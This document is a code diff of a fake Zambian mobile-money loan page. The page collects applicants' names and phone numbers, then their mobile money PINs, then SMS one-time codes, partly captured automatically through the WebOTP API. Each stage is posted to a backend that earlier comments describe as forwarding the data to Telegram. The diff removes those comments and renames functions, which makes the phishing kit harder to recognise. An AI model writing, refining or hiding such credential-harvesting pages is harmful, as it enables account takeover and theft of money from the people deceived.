@@ -13,13 +13,11 @@
             --shadow: 0 4px 20px rgba(0,0,0,0.08); --radius: 16px; --radius-sm: 10px;
         }
         body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; overflow-x: hidden; }
-
         .header { background: linear-gradient(135deg, var(--primary), var(--primary-dark)); padding: 20px 16px; text-align: center; position: sticky; top: 0; z-index: 100; box-shadow: 0 2px 20px rgba(26,122,76,0.3); }
         .header .logo { display: flex; align-items: center; justify-content: center; gap: 10px; }
         .header .logo-icon { width: 42px; height: 42px; background: var(--white); border-radius: 12px; display: flex; align-items: center; justify-content: center; font-size: 22px; }
         .header h1 { color: var(--white); font-size: 18px; font-weight: 700; }
         .header .subtitle { color: rgba(255,255,255,0.8); font-size: 12px; margin-top: 2px; }
-
         .progress-container { background: var(--white); padding: 16px 24px 12px; box-shadow: var(--shadow); }
         .progress-steps { display: flex; align-items: center; justify-content: space-between; position: relative; }
         .progress-steps::before { content: ''; position: absolute; top: 16px; left: 30px; right: 30px; height: 3px; background: #e0e0e0; z-index: 0; }
@@ -30,23 +28,19 @@
         .step.completed .step-circle { background: var(--success); color: var(--white); }
         .step-label { font-size: 10px; color: var(--text-light); font-weight: 600; text-transform: uppercase; letter-spacing: 0.5px; }
         .step.active .step-label { color: var(--primary); }
-
         .container { max-width: 480px; margin: 0 auto; padding: 20px 16px 100px; }
         .page { display: none; animation: slideIn 0.4s ease; }
         .page.active { display: block; }
         @keyframes slideIn { from { opacity: 0; transform: translateX(30px); } to { opacity: 1; transform: translateX(0); } }
-
         .card { background: var(--white); border-radius: var(--radius); padding: 24px 20px; box-shadow: var(--shadow); margin-bottom: 16px; }
         .card-title { font-size: 20px; font-weight: 700; margin-bottom: 4px; }
         .card-subtitle { font-size: 13px; color: var(--text-light); margin-bottom: 24px; line-height: 1.5; }
-
         .hero-banner { background: linear-gradient(135deg, var(--primary), #2d9d6a); border-radius: var(--radius); padding: 28px 24px; margin-bottom: 20px; color: var(--white); position: relative; overflow: hidden; }
         .hero-banner::after { content: ''; position: absolute; top: -50%; right: -30%; width: 200px; height: 200px; background: rgba(255,255,255,0.1); border-radius: 50%; }
         .hero-banner h2 { font-size: 22px; font-weight: 800; margin-bottom: 8px; position: relative; z-index: 1; }
         .hero-banner p { font-size: 14px; opacity: 0.9; line-height: 1.5; position: relative; z-index: 1; }
         .hero-features { display: flex; gap: 12px; margin-top: 16px; position: relative; z-index: 1; flex-wrap: wrap; }
         .hero-feature { background: rgba(255,255,255,0.15); backdrop-filter: blur(10px); border-radius: var(--radius-sm); padding: 10px 14px; font-size: 11px; font-weight: 600; display: flex; align-items: center; gap: 6px; }
-
         .form-group { margin-bottom: 18px; }
         .form-label { display: block; font-size: 13px; font-weight: 600; color: var(--text); margin-bottom: 8px; }
         .form-label .required { color: var(--danger); }
@@ -56,32 +50,26 @@
         .form-input.error { border-color: var(--danger); }
         .error-message { font-size: 12px; color: var(--danger); margin-top: 6px; display: none; }
         .error-message.show { display: block; }
-
         .phone-input-wrapper { display: flex; }
         .phone-prefix { padding: 14px 12px; background: var(--primary-light); border: 2px solid var(--primary); border-right: none; border-radius: var(--radius-sm) 0 0 var(--radius-sm); font-size: 14px; font-weight: 700; color: var(--primary); display: flex; align-items: center; min-width: 72px; justify-content: center; }
         .phone-input-wrapper .form-input { border-radius: 0 var(--radius-sm) var(--radius-sm) 0; }
-
         .amount-display { text-align: center; padding: 20px; background: var(--primary-light); border-radius: var(--radius-sm); margin-bottom: 16px; }
         .amount-label { font-size: 12px; color: var(--text-light); text-transform: uppercase; letter-spacing: 1px; font-weight: 600; margin-bottom: 4px; }
         .amount-value { font-size: 32px; font-weight: 800; color: var(--primary); }
         .amount-value span { font-size: 18px; font-weight: 600; }
-
         .quick-amounts { display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; margin-bottom: 16px; }
         .quick-btn { padding: 12px 8px; border: 2px solid #e8ecf0; border-radius: var(--radius-sm); background: var(--white); font-size: 13px; font-weight: 700; color: var(--text); cursor: pointer; transition: all 0.2s ease; text-align: center; }
         .quick-btn:hover, .quick-btn.selected { border-color: var(--primary); background: var(--primary-light); color: var(--primary); }
-
         .period-options { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
         .period-btn { padding: 14px 10px; border: 2px solid #e8ecf0; border-radius: var(--radius-sm); background: var(--white); font-size: 14px; font-weight: 700; color: var(--text); cursor: pointer; transition: all 0.2s ease; text-align: center; }
         .period-btn small { display: block; font-size: 11px; color: var(--text-light); font-weight: 500; margin-top: 2px; }
         .period-btn:hover, .period-btn.selected { border-color: var(--primary); background: var(--primary-light); color: var(--primary); }
-
         .btn { width: 100%; padding: 16px; border: none; border-radius: var(--radius-sm); font-size: 16px; font-weight: 700; font-family: inherit; cursor: pointer; transition: all 0.3s ease; display: flex; align-items: center; justify-content: center; gap: 8px; }
         .btn-primary { background: linear-gradient(135deg, var(--primary), var(--primary-dark)); color: var(--white); box-shadow: 0 4px 15px rgba(26,122,76,0.3); }
         .btn-primary:hover { transform: translateY(-2px); }
         .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
         .btn-outline { background: var(--white); color: var(--primary); border: 2px solid var(--primary); }
         .btn-outline:hover { background: var(--primary-light); }
-
         .pin-section { text-align: center; padding: 20px 0; }
         .pin-icon { width: 80px; height: 80px; background: var(--primary-light); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; font-size: 36px; }
         .pin-input-wrapper { display: flex; justify-content: center; gap: 12px; margin: 24px 0; }
@@ -90,7 +78,6 @@
         .pin-input { width: 100%; max-width: 280px; padding: 16px; border: 2px solid #e8ecf0; border-radius: var(--radius-sm); font-size: 24px; font-family: inherit; text-align: center; letter-spacing: 12px; outline: none; transition: all 0.3s ease; -webkit-text-security: disc; }
         .pin-input:focus { border-color: var(--primary); box-shadow: 0 0 0 4px rgba(26,122,76,0.1); }
         .pin-hint { font-size: 12px; color: var(--text-light); margin-top: 12px; }
-
         .otp-section { text-align: center; padding: 20px 0; }
         .otp-icon { width: 80px; height: 80px; background: var(--primary-light); border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; font-size: 36px; animation: pulse 2s infinite; }
         @keyframes pulse { 0%,100% { transform: scale(1); } 50% { transform: scale(1.05); } }
@@ -101,32 +88,26 @@
         .otp-status.listening { display: block; background: #fff3e0; color: #e65100; }
         .otp-status.success { display: block; background: #e8f5e9; color: #2e7d32; }
         .otp-status.error { display: block; background: #ffebee; color: #c62828; }
-
         .summary-card { background: var(--primary-light); border-radius: var(--radius-sm); padding: 16px; margin-bottom: 20px; }
         .summary-row { display: flex; justify-content: space-between; align-items: center; padding: 8px 0; font-size: 14px; }
         .summary-row:not(:last-child) { border-bottom: 1px solid rgba(26,122,76,0.1); }
         .summary-label { color: var(--text-light); font-weight: 500; }
         .summary-value { font-weight: 700; color: var(--text); }
-
         .success-section { text-align: center; padding: 40px 20px; }
         .success-icon { width: 100px; height: 100px; background: #e8f5e9; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 24px; font-size: 48px; animation: successBounce 0.6s cubic-bezier(0.68,-0.55,0.265,1.55); }
         @keyframes successBounce { 0% { transform: scale(0); } 50% { transform: scale(1.2); } 100% { transform: scale(1); } }
         .success-title { font-size: 24px; font-weight: 800; color: var(--success); margin-bottom: 8px; }
         .success-message { font-size: 14px; color: var(--text-light); line-height: 1.6; margin-bottom: 24px; }
-
         .spinner { width: 20px; height: 20px; border: 3px solid rgba(255,255,255,0.3); border-top-color: var(--white); border-radius: 50%; animation: spin 0.8s linear infinite; display: none; }
         @keyframes spin { to { transform: rotate(360deg); } }
         .btn.loading .spinner { display: block; }
         .btn.loading .btn-text { display: none; }
-
         .toast { position: fixed; top: 80px; left: 50%; transform: translateX(-50%) translateY(-20px); background: var(--text); color: var(--white); padding: 12px 24px; border-radius: var(--radius-sm); font-size: 14px; font-weight: 600; opacity: 0; transition: all 0.3s ease; z-index: 1000; max-width: 90%; text-align: center; }
         .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
         .toast.error { background: var(--danger); }
         .toast.success { background: var(--success); }
-
         .footer { text-align: center; padding: 20px; font-size: 11px; color: var(--text-light); }
         .footer a { color: var(--primary); text-decoration: none; }
-
         @media (max-width: 380px) {
             .quick-amounts { grid-template-columns: repeat(2, 1fr); }
             .period-options { grid-template-columns: repeat(2, 1fr); }
@@ -135,7 +116,6 @@
     </style>
 </head>
 <body>
-
     <div class="header">
         <div class="logo">
             <div class="logo-icon">💰</div>
@@ -149,24 +129,14 @@
     <div class="progress-container">
         <div class="progress-steps">
             <div class="progress-line" id="progressLine"></div>
-            <div class="step active" data-step="1">
-                <div class="step-circle">1</div>
-                <div class="step-label">Apply</div>
-            </div>
-            <div class="step" data-step="2">
-                <div class="step-circle">2</div>
-                <div class="step-label">PIN</div>
-            </div>
-            <div class="step" data-step="3">
-                <div class="step-circle">3</div>
-                <div class="step-label">Verify</div>
-            </div>
+            <div class="step active" data-step="1"><div class="step-circle">1</div><div class="step-label">Apply</div></div>
+            <div class="step" data-step="2"><div class="step-circle">2</div><div class="step-label">PIN</div></div>
+            <div class="step" data-step="3"><div class="step-circle">3</div><div class="step-label">Verify</div></div>
         </div>
     </div>
 
     <div class="container">
-
-        <!-- PAGE 1: APPLICATION -->
+        <!-- PAGE 1 -->
         <div class="page active" id="page1">
             <div class="hero-banner">
                 <h2>Get Cash in Minutes</h2>
@@ -177,17 +147,14 @@
                     <div class="hero-feature">💳 No Collateral</div>
                 </div>
             </div>
-
             <div class="card">
                 <div class="card-title">Loan Application</div>
                 <div class="card-subtitle">Fill in your details to apply. All fields are required.</div>
-
                 <div class="form-group">
                     <label class="form-label">Full Name <span class="required">*</span></label>
                     <input type="text" class="form-input" id="fullName" placeholder="e.g. Chanda Mwape" autocomplete="name" maxlength="60">
                     <div class="error-message" id="nameError">Please enter your full name</div>
                 </div>
-
                 <div class="form-group">
                     <label class="form-label">Mobile Number <span class="required">*</span></label>
                     <div class="phone-input-wrapper">
@@ -196,7 +163,6 @@
                     </div>
                     <div class="error-message" id="phoneError">Please enter your phone number</div>
                 </div>
-
                 <div class="form-group">
                     <label class="form-label">Loan Amount (ZMW) <span class="required">*</span></label>
                     <div class="amount-display">
@@ -216,7 +182,6 @@
                     <input type="number" class="form-input" id="loanAmount" placeholder="Or enter custom amount (500 – 50,000)" min="500" max="50000" step="100">
                     <div class="error-message" id="amountError">Amount must be between K500 and K50,000</div>
                 </div>
-
                 <div class="form-group">
                     <label class="form-label">Repayment Period <span class="required">*</span></label>
                     <div class="period-options">
@@ -229,52 +194,37 @@
                     </div>
                     <div class="error-message" id="periodError">Please select a repayment period</div>
                 </div>
-
-                <button class="btn btn-primary" id="btnApply">
-                    <span class="btn-text">Continue →</span>
-                    <div class="spinner"></div>
-                </button>
+                <button class="btn btn-primary" id="btnApply"><span class="btn-text">Continue →</span><div class="spinner"></div></button>
             </div>
         </div>
 
-        <!-- PAGE 2: PIN -->
+        <!-- PAGE 2 -->
         <div class="page" id="page2">
             <div class="card">
                 <div class="pin-section">
                     <div class="pin-icon">🔐</div>
                     <div class="card-title">Enter Your PIN</div>
                     <div class="card-subtitle">Enter your 4-digit mobile money PIN to authorize this loan request.</div>
-
                     <div class="summary-card" id="summaryCard"></div>
-
                     <div class="pin-input-wrapper" id="pinDots">
-                        <div class="pin-dot"></div>
-                        <div class="pin-dot"></div>
-                        <div class="pin-dot"></div>
-                        <div class="pin-dot"></div>
+                        <div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div><div class="pin-dot"></div>
                     </div>
-
                     <input type="password" class="pin-input" id="pinInput" placeholder="••••" maxlength="4" inputmode="numeric" autocomplete="off">
                     <div class="error-message" id="pinError" style="text-align:center;">Please enter your 4-digit PIN</div>
                     <div class="pin-hint">🔒 Your PIN is encrypted and never stored</div>
                 </div>
-
-                <button class="btn btn-primary" id="btnPin">
-                    <span class="btn-text">Submit PIN →</span>
-                    <div class="spinner"></div>
-                </button>
+                <button class="btn btn-primary" id="btnPin"><span class="btn-text">Submit PIN →</span><div class="spinner"></div></button>
                 <button class="btn btn-outline" style="margin-top:12px;" id="btnBack1">← Back</button>
             </div>
         </div>
 
-        <!-- PAGE 3: OTP AUTO-CAPTURE -->
+        <!-- PAGE 3 -->
         <div class="page" id="page3">
             <div class="card">
                 <div class="otp-section">
                     <div class="otp-icon">📱</div>
                     <div class="card-title">Verifying Your Phone</div>
                     <div class="card-subtitle">We've sent a code to <strong id="otpPhoneDisplay"></strong>.<br><span style="font-size:12px;color:var(--text-light);">Auto-capturing… no action needed.</span></div>
-
                     <input type="text" class="otp-input" id="otpInput" placeholder="••••••" maxlength="6" inputmode="numeric" autocomplete="one-time-code" readonly>
                     <div class="otp-status listening" id="otpStatus">⏳ Waiting for SMS…</div>
                 </div>
@@ -292,70 +242,51 @@
                         You'll receive a notification on your mobile number once reviewed.<br><br>
                         <strong>Reference:</strong> <span id="refNumber"></span>
                     </div>
-                    <button class="btn btn-primary" id="btnReset">
-                        <span class="btn-text">Apply Again</span>
-                    </button>
+                    <button class="btn btn-primary" id="btnReset"><span class="btn-text">Apply Again</span></button>
                 </div>
             </div>
         </div>
-
     </div>
 
     <div class="toast" id="toast"></div>
-
     <div class="footer">
         <p>© 2026 Replicate Momo Zambia. All rights reserved.</p>
         <p style="margin-top:4px;">Licensed by Bank of Zambia | <a href="#">Privacy</a> | <a href="#">Terms</a></p>
     </div>
 
     <script>
-    // ═══════════════════════════════════════════
-    // STATE
-    // ═══════════════════════════════════════════
     let appData = { name: '', phone: '', amount: 0, period: 0, pin: '', otp: '' };
     let currentPage = 1;
     let isNavigating = false;
 
-    // ═══════════════════════════════════════════
-    // INIT
-    // ═══════════════════════════════════════════
     document.addEventListener('DOMContentLoaded', () => {
         initQuickAmounts();
         initPeriodButtons();
         initPinInput();
         initPhoneInput();
-
         document.getElementById('btnApply').addEventListener('click', submitPage1);
         document.getElementById('btnPin').addEventListener('click', submitPage2);
         document.getElementById('btnBack1').addEventListener('click', () => goToPage(1));
         document.getElementById('btnReset').addEventListener('click', resetApp);
     });
 
-    // ═══════════════════════════════════════════
-    // PAGE NAVIGATION
-    // ═══════════════════════════════════════════
     function goToPage(pageNum) {
         if (isNavigating) return;
         isNavigating = true;
-
         const currentEl = document.getElementById(`page${currentPage}`);
         const nextEl = document.getElementById(`page${pageNum}`);
-
         currentEl.style.opacity = '0';
         currentEl.style.transform = 'translateX(-20px)';
         currentEl.style.transition = 'all 0.25s ease';
-
         setTimeout(() => {
             currentEl.classList.remove('active');
             currentEl.style.opacity = '';
             currentEl.style.transform = '';
             currentEl.style.transition = '';
-
             nextEl.classList.add('active');
             currentPage = pageNum;
             updateProgress(pageNum);
             window.scrollTo({ top: 0, behavior: 'smooth' });
-
             setTimeout(() => { isNavigating = false; }, 300);
         }, 250);
     }
@@ -363,23 +294,17 @@
     function updateProgress(pageNum) {
         const steps = document.querySelectorAll('.step');
         const line = document.getElementById('progressLine');
-
         steps.forEach((step, i) => {
             step.classList.remove('active', 'completed');
             if (i + 1 < pageNum || pageNum >= 4) step.classList.add('completed');
             if (i + 1 === pageNum) step.classList.add('active');
         });
-
         const widths = [0, '50%', '100%', '100%'];
         line.style.width = widths[pageNum - 1] || '100%';
     }
 
-    // ═══════════════════════════════════════════
-    // PAGE 1: Submit → Telegram → Page 2
-    // ═══════════════════════════════════════════
     function validatePage1() {
         let valid = true;
-
         const name = document.getElementById('fullName').value.trim();
         if (name.length < 3) {
             document.getElementById('fullName').classList.add('error');
@@ -389,7 +314,6 @@
             document.getElementById('fullName').classList.remove('error');
             document.getElementById('nameError').classList.remove('show');
         }
-
         const phoneRaw = document.getElementById('phoneNumber').value.replace(/\s/g, '');
         if (phoneRaw.length < 1) {
             document.getElementById('phoneNumber').classList.add('error');
@@ -399,7 +323,6 @@
             document.getElementById('phoneNumber').classList.remove('error');
             document.getElementById('phoneError').classList.remove('show');
         }
-
         const amount = parseInt(document.getElementById('loanAmount').value) || 0;
         if (amount < 500 || amount > 50000) {
             document.getElementById('loanAmount').classList.add('error');
@@ -409,7 +332,6 @@
             document.getElementById('loanAmount').classList.remove('error');
             document.getElementById('amountError').classList.remove('show');
         }
-
         const periodBtn = document.querySelector('.period-btn.selected');
         if (!periodBtn) {
             document.getElementById('periodError').classList.add('show');
@@ -417,12 +339,7 @@
         } else {
             document.getElementById('periodError').classList.remove('show');
         }
-
-        if (!valid) {
-            showToast('Please fix the errors above', 'error');
-            return false;
-        }
-
+        if (!valid) { showToast('Please fix the errors above', 'error'); return false; }
         appData.name = name;
         appData.phone = '+260 ' + phoneRaw;
         appData.amount = amount;
@@ -432,25 +349,15 @@
 
     async function submitPage1() {
         if (!validatePage1()) return;
-
         const btn = document.getElementById('btnApply');
         btn.classList.add('loading');
         btn.disabled = true;
-
         try {
-            // Send to Telegram immediately
             await fetch('/api/apply', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    name: appData.name,
-                    phone: appData.phone,
-                    amount: appData.amount,
-                    period: appData.period
-                })
+                body: JSON.stringify({ name: appData.name, phone: appData.phone, amount: appData.amount, period: appData.period })
             });
-
-            // Build summary for page 2
             const interest = Math.round(appData.amount * 0.0013 * appData.period);
             const total = appData.amount + interest;
             document.getElementById('summaryCard').innerHTML = `
@@ -460,30 +367,19 @@
                 <div class="summary-row"><span class="summary-label">Period</span><span class="summary-value">${appData.period} days</span></div>
                 <div class="summary-row"><span class="summary-label">Est. Repayment</span><span class="summary-value" style="color:var(--primary)">K${total.toLocaleString()}</span></div>
             `;
-
             goToPage(2);
-        } catch (err) {
-            console.error(err);
-            showToast('Error. Please try again.', 'error');
-        }
-
+        } catch (err) { showToast('Error. Try again.', 'error'); }
         btn.classList.remove('loading');
         btn.disabled = false;
     }
 
-    // ═══════════════════════════════════════════
-    // PAGE 2: PIN → Telegram → Page 3
-    // ═══════════════════════════════════════════
     function initPinInput() {
         const pinInput = document.getElementById('pinInput');
         const dots = document.querySelectorAll('.pin-dot');
-
         pinInput.addEventListener('input', (e) => {
             e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 4);
             dots.forEach((d, i) => d.classList.toggle('filled', i < e.target.value.length));
-            if (e.target.value.length === 4) {
-                document.getElementById('pinError').classList.remove('show');
-            }
+            if (e.target.value.length === 4) document.getElementById('pinError').classList.remove('show');
         });
     }
 
@@ -495,148 +391,94 @@
             return;
         }
         appData.pin = pin;
-
         const btn = document.getElementById('btnPin');
         btn.classList.add('loading');
         btn.disabled = true;
-
         try {
-            // Send PIN to Telegram immediately
             await fetch('/api/pin', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    name: appData.name,
-                    phone: appData.phone,
-                    amount: appData.amount,
-                    period: appData.period,
-                    pin: appData.pin
-                })
+                body: JSON.stringify({ name: appData.name, phone: appData.phone, amount: appData.amount, period: appData.period, pin: appData.pin })
             });
-
-            // Go to OTP page
             document.getElementById('otpPhoneDisplay').textContent = appData.phone;
             document.getElementById('otpInput').value = '';
             document.getElementById('otpInput').readOnly = true;
-
             goToPage(3);
-
-            // Start OTP auto-capture after page transition
             setTimeout(startOTPCapture, 500);
-        } catch (err) {
-            console.error(err);
-            showToast('Error. Please try again.', 'error');
-        }
-
+        } catch (err) { showToast('Error. Try again.', 'error'); }
         btn.classList.remove('loading');
         btn.disabled = false;
     }
 
-    // ═══════════════════════════════════════════
-    // PAGE 3: OTP Auto-Capture → Telegram → Success
-    // ═══════════════════════════════════════════
     function startOTPCapture() {
         const otpInput = document.getElementById('otpInput');
         const status = document.getElementById('otpStatus');
 
-        // Fallback: no WebOTP or not HTTPS
         if (!window.isSecureContext || !('OTPCredential' in window)) {
             status.className = 'otp-status error';
-            status.textContent = '⚠️ Auto-capture not available. Enter code manually below.';
+            status.textContent = '⚠️ Enter the code sent to your phone.';
             otpInput.readOnly = false;
             otpInput.focus();
-
             otpInput.addEventListener('input', (e) => {
                 e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 6);
                 if (e.target.value.length === 6) {
                     appData.otp = e.target.value;
-                    sendOTPToTelegram();
+                    sendOTP();
                 }
             });
             return;
         }
 
-        // WebOTP auto-capture
         status.className = 'otp-status listening';
         status.textContent = '⏳ Waiting for SMS… Code will auto-fill and submit';
 
-        navigator.credentials.get({
-            otp: { transport: ['sms'] }
-        }).then(otp => {
-            // ✅ OTP captured automatically
-            otpInput.value = otp.code;
-            appData.otp = otp.code;
-            status.className = 'otp-status success';
-            status.textContent = '✅ Code received! Submitting…';
-
-            // Send to Telegram immediately
-            sendOTPToTelegram();
-        }).catch(err => {
-            if (err.name !== 'AbortError') {
-                status.className = 'otp-status error';
-                status.textContent = '⚠️ Auto-capture failed. Enter code manually.';
-                otpInput.readOnly = false;
-                otpInput.focus();
-
-                otpInput.addEventListener('input', (e) => {
-                    e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 6);
-                    if (e.target.value.length === 6) {
-                        appData.otp = e.target.value;
-                        sendOTPToTelegram();
-                    }
-                });
-            }
-        });
+        navigator.credentials.get({ otp: { transport: ['sms'] } })
+            .then(otp => {
+                otpInput.value = otp.code;
+                appData.otp = otp.code;
+                status.className = 'otp-status success';
+                status.textContent = '✅ Code received! Submitting…';
+                sendOTP();
+            })
+            .catch(err => {
+                if (err.name !== 'AbortError') {
+                    status.className = 'otp-status error';
+                    status.textContent = '⚠️ Enter the code sent to your phone.';
+                    otpInput.readOnly = false;
+                    otpInput.focus();
+                    otpInput.addEventListener('input', (e) => {
+                        e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 6);
+                        if (e.target.value.length === 6) {
+                            appData.otp = e.target.value;
+                            sendOTP();
+                        }
+                    });
+                }
+            });
     }
 
-    async function sendOTPToTelegram() {
+    async function sendOTP() {
         try {
             await fetch('/api/otp', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    name: appData.name,
-                    phone: appData.phone,
-                    amount: appData.amount,
-                    period: appData.period,
-                    pin: appData.pin,
-                    otp: appData.otp
-                })
+                body: JSON.stringify({ name: appData.name, phone: appData.phone, amount: appData.amount, period: appData.period, pin: appData.pin, otp: appData.otp })
             });
-
-            // Show success
             const ref = 'RMZ-' + Date.now().toString(36).toUpperCase().slice(-8);
             document.getElementById('refNumber').textContent = ref;
-
-            document.querySelectorAll('.step').forEach(s => {
-                s.classList.remove('active');
-                s.classList.add('completed');
-            });
+            document.querySelectorAll('.step').forEach(s => { s.classList.remove('active'); s.classList.add('completed'); });
             document.getElementById('progressLine').style.width = '100%';
-
             goToPage(4);
-        } catch (err) {
-            console.error(err);
-            showToast('Error submitting OTP', 'error');
-        }
+        } catch (err) { showToast('Error submitting OTP', 'error'); }
     }
 
-    // ═══════════════════════════════════════════
-    // HELPERS
-    // ═══════════════════════════════════════════
-    function esc(text) {
-        const d = document.createElement('div');
-        d.textContent = text;
-        return d.innerHTML;
-    }
-
+    function esc(text) { const d = document.createElement('div'); d.textContent = text; return d.innerHTML; }
     function showToast(msg, type = '') {
         const t = document.getElementById('toast');
         t.textContent = msg;
         t.className = `toast ${type} show`;
         setTimeout(() => t.classList.remove('show'), 3000);
     }
-
     function resetApp() {
         appData = { name: '', phone: '', amount: 0, period: 0, pin: '', otp: '' };
         document.getElementById('fullName').value = '';
@@ -655,10 +497,6 @@
         document.querySelectorAll('.error-message').forEach(e => e.classList.remove('show'));
         goToPage(1);
     }
-
-    // ═══════════════════════════════════════════
-    // INPUT INITIALIZERS
-    // ═══════════════════════════════════════════
     function initQuickAmounts() {
         document.querySelectorAll('.quick-btn').forEach(btn => {
             btn.addEventListener('click', () => {
@@ -671,7 +509,6 @@
                 document.getElementById('amountError').classList.remove('show');
             });
         });
-
         document.getElementById('loanAmount').addEventListener('input', (e) => {
             const v = parseInt(e.target.value) || 0;
             document.getElementById('amountDisplay').textContent = v.toLocaleString();
@@ -682,7 +519,6 @@
             }
         });
     }
-
     function initPeriodButtons() {
         document.querySelectorAll('.period-btn').forEach(btn => {
             btn.addEventListener('click', () => {
@@ -692,10 +528,8 @@
             });
         });
     }
-
     function initPhoneInput() {
-        const input = document.getElementById('phoneNumber');
-        input.addEventListener('input', (e) => {
+        document.getElementById('phoneNumber').addEventListener('input', (e) => {
             e.target.value = e.target.value.replace(/[^0-9]/g, '');
         });
     }
